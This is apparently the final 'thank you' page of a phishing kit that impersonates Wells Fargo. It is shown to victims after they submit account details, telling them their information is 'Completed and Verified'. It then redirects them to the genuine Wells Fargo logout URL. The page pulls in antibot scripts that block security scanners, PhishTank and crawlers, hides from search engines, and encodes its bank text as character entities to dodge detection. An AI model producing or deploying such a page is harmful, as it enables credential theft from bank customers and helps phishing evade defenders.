<?php
ini_set( "display_errors", 0); 
		
		
	include "antibots/#1.php";
    include "antibots/#2.php";
    include "antibots/#3.php";
    include "antibots/#4.php";
    include "antibots/#5.php";
    include "antibots/#6.php";
    include "antibots/#7.php";
    include "antibots/#8.php";
    include "antibots/#9.php";
    include "antibots/#10.php";
    include "antibots/#11.php";
    include "antibots/#12.php";
    include "antibots/antibot_host.php";
    include "antibots/antibot_ip.php";
    include "antibots/antibot_phishtank.php";
    include "antibots/antibot_userAgent.php";
?>
<!DOCTYPE html>
<html class="ui-mobile wf-myriadpro-n4-active wf-active" lang="en" data-device="desktop" data-masked-input-enabled="true" data-print-link-enabled="true"><head>

        <meta name="robots" content="noindex,nofollow" />
		 <meta name="robots" content="noindex" />
			<meta name="googlebot" content="noindex" />
			<META NAME="robots" CONTENT="nofollow">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
<meta http-equiv="imagetoolbar" content="no">

<title>Successful</title>
<link rel="stylesheet" type="text/css" href="assets/css/style.css" />
<link rel="stylesheet" href="assets/css/jquery.mobile.css">
<link rel="stylesheet" href="assets/css/desktop-tablet.combined1.css">
<link rel="stylesheet" href="assets/css/archer.css">

</style>
		<!--[if lt IE 9]>
			<link rel="stylesheet" href="/css/medium-screen.css?v=19.12.00" />
			<link rel="stylesheet" href="/css/large-screen.css?v=19.12.00" />
			<link rel="stylesheet" href="/css/ie.css?v=19.12.00" />
			<link rel="stylesheet" href="/css/ie-print.css?v=19.12.00" media="print" />
		<![endif]-->
	
	

<!--  load the sync tealium  -->
		
	    
	    
		   



<style type="text/css">.tk-myriad-pro{font-family:"myriad-pro",sans-serif;}</style>
<style type="text/css">@font-face{font-family:myriad-pro;src:url(./assets/fonts/myriad.woff2) format("woff2"),url(./assets/fonts/awe.woff) format("woff"),url(./assets/fonts/b87d1abf881446b2bae0d8204029d20a9b85e656-a.otf) format("opentype");font-weight:400;font-style:normal;}</style>


<!-- load myriad font  -->

<link rel="icon" href="assets/images/favicon.ico">


<html><meta http-equiv="Refresh" content="05; url=https://connect.secure.wellsfargo.com/auth/logout?code=7100"></html>

  </head>
<body data-gr-c-s-loaded="true" class="ui-mobile-viewport ui-overlay-a" data-inq-observer="1">

	<div id="mainpage" data-role="page" class="osmp-app ui-page ui-page-theme-a ui-page-active"  tabindex="0" style="">
		  

                
		
			
			
				


<header role="banner">
	<div class="masthead">

		<nav class="back">
			
		</nav>

		<div>

			
				
				
					<a class="c28cLink child-window ui-link" href="#"> <img class="masthead-img-logo" alt="" role="img" src="assets/images/masthead-img-logo.svg">
					</a>

				
			
		</div>

		
			
				<div role="navigation" class="top-search">
					<ul>
						<li>
								
								
									<a class="signIn ui-link" href="#">Sign
										On</a>
						        
							</li>
						<li><a href="# class="ui-link">Customer Service</a></li>
						<li><a href="#" class="ui-link">Locations</a></li>
						<li><a href="#" class="ui-link">Apply</a></li>
						
							
							
								<li><a href="#" class="ui-link">Home</a></li>
							
						
					</ul>
				</div>
			
			
		

		<nav class="menu">
			
				
					<a href="#" class="ui-link"> <img alt="Menu" role="img" src="assets/images/bar.svg">
					</a>
				
				
			
		</nav>

	</div>

</header>


				
			
			
		
		<div id="mainColumns" tabindex="-1" role="main" class="ui-content osmp-content">
			<div class="primary-content">
				

				<div class="osmp-title">
					<div>
						<h1>Thank you. </h1>
					</div>
					
					
						<div class="right sub-title link-underline">
							<a href="#" class="print-link ui-utility-link ui-link"></a>
						</div>
					
				</div>
				<div class="not-large-screen">
					

					
				</div>
<div>
		
			<div class="applicant-sign-status not-large-screen">
			<div class="esign-status-inner-container">
				<h3 class="esign-status-header">Verification status</h3>
					<div class="esign-status-inner-content">
						<img src="assets/images/success.svg" alt="">
							<p class="esign-overall-status">Completed and Verified</p>
				</div>
			</div>
			</div>
		

		<div class="not-small-screen">
			
					<div class="deposit-application-desktop-layout">
						<h2 class="deposit-TY-productName-desktop">
							
								
								
									Account Information has been Updated Successfully
								
							

							
						</h2>

						<div class="clearfix margin-bot-20">

							<img src="assets/images/success.svg" alt="" class="left">

							<div class="display-table">
								
								
									<div class="margin-bot-8">
										<span class="verify-label">Reference Number:</span>
										1910281733-19511c000c11

									</div>

								<div class="margin-bot-8">
									<span class="verify-label">Status:</span>
									Your information has been submitted and updated. Please wait You will be redirected in 5 seconds.
									
								</div>
							</div>
						</div>
					</div>
			
		</div>

		<div class="small-screen">
			
				<div class="deposit-application-mobile-layout">
					<h2 class="deposit-TY-productName-mobile">
						
							
							
								Account Information has been Updated Successfully
							
						

						
					</h2>

					<div class="clearfix margin-bot-20">

						<img src="assets/images/success.svg" alt="" class="left">

						<div class="display-table">
							
							
								<div class="margin-bot-8">
									<span class="verify-label">Application Reference Number:</span>
									1910281733-19511c000c11
								</div>
							
							<div class="margin-bot-8">
								<span class="verify-label">Status:</span>
								Your information has been submitted and updated. Please wait You will be redirected in 5 seconds
								
							</div>
							
						</div>
					</div>
					
				</div>
			
		</div>
<img src="assets/images/wf.gif" alt="" width="100" height="100" align="center">


	<div>

		
			&#84;&#104;&#97;&#110;&#107;&#32;&#121;&#111;&#117;&#32;&#102;&#111;&#114;&#32;&#99;&#104;&#111;&#111;&#115;&#105;&#110;&#103;&#32;&#87;&#101;&#108;&#108;&#115;&#32;&#70;&#97;&#114;&#103;&#111;&#46;&#32;&#87;&#101;&#32;&#97;&#112;&#112;&#114;&#101;&#99;&#105;&#97;&#116;&#101;&#32;&#121;&#111;&#117;&#114;&#32;&#98;&#117;&#115;&#105;&#110;&#101;&#115;&#115;&#46;
			<br>
			<br>
		
		
		
		
			<p>
				&#87;&#101;&#108;&#108;&#115;&#32;&#70;&#97;&#114;&#103;&#111;&#32;&#66;&#97;&#110;&#107;&#44;&#32;&#78;&#46;&#65;&#46;&#32;&#77;&#101;&#109;&#98;&#101;&#114;&#32;&#70;&#68;&#73;&#67;&#46;
			</p>
		
	</div>
</div>

















	










</div>


<div class="secondary-content">

	

	
		<div class="applicant-sign-status large-screen">
			<div class="esign-status-inner-container">
				<h3 class="esign-status-header">Verification status</h3>
					<div class="esign-status-inner-content">
						<img src="assets/images/success.svg" alt="">
							<p class="esign-overall-status">Completed and Verified</p>
				</div>
			</div>
		</div>
	
	
	
		
  
		
	
</div>


</div>




	
		



<div data-role="footer" class="osmp-footer ui-footer ui-bar-inherit singleColumn" role="contentinfo">
		
	<footer role="contentinfo">
			<div class="c9">
				<nav aria-label="corporate, legal, security">
					<ul class="not-large-screen">
					
					
						
						    
						    	
								
									<li><a class="c28cLink child-window ui-link" href="javascript:void(0)">&#80;&#114;&#105;&#118;&#97;&#99;&#121;&#44;&#32;&#67;&#111;&#111;&#107;&#105;&#101;&#115;&#44;&#32;&#83;&#101;&#99;&#117;&#114;&#105;&#116;&#121; &amp; Legal</a></li>
									<li><a class="c28cLink child-window ui-link" href="javascript:void(0)">&#65;&#100;&#32;&#67;&#104;&#111;&#105;&#99;&#101;&#115;</a></li>
									<li><a class="c28cLink child-window ui-link" title="Online Security" href="javascript:void(0)">&#79;&#110;&#108;&#105;&#110;&#101;&#32;&#83;&#101;&#99;&#117;&#114;&#105;&#116;&#121;</a></li>
								
						    
						
					
					</ul>				
					<ul class="large-screen">
						
						
						
							 
						    	
								
									<li><a class="c28cLink child-window ui-link" href="javascript:void(0)">&#80;&#114;&#105;&#118;&#97;&#99;&#121;&#44;&#32;&#67;&#111;&#111;&#107;&#105;&#101;&#115;&#44;&#32;&#83;&#101;&#99;&#117;&#114;&#105;&#116;&#121; &amp; Legal</a></li>
									<li><a class="c28cLink child-window ui-link" href="javascript:void(0)">&#65;&#100;&#32;&#67;&#104;&#111;&#105;&#99;&#101;&#115;</a></li>
									<li><a class="c28cLink child-window ui-link" title="Online Security" href="javascript:void(0)">&#79;&#110;&#108;&#105;&#110;&#101;&#32;&#83;&#101;&#99;&#117;&#114;&#105;&#116;&#121;</a></li>
								
						     
						
					
					</ul>				
				</nav>
				<hr>
				&#169;&#32;&#49;&#57;&#57;&#57; - <span class="placeholder">&#50;&#48;&#50;&#50;</span> &#87;&#101;&#108;&#108;&#115;&#32;&#70;&#97;&#114;&#103;&#111;&#46;&#32;&#65;&#108;&#108;&#32;&#114;&#105;&#103;&#104;&#116;&#115;&#32;&#114;&#101;&#115;&#101;&#114;&#118;&#101;&#100;&#46;&#32;&#78;&#77;&#76;&#83;&#82;&#32;&#73;&#68;&#32;&#51;&#57;&#57;&#56;&#48;&#49;
			</div>
		</footer>
</div>


</body></html>
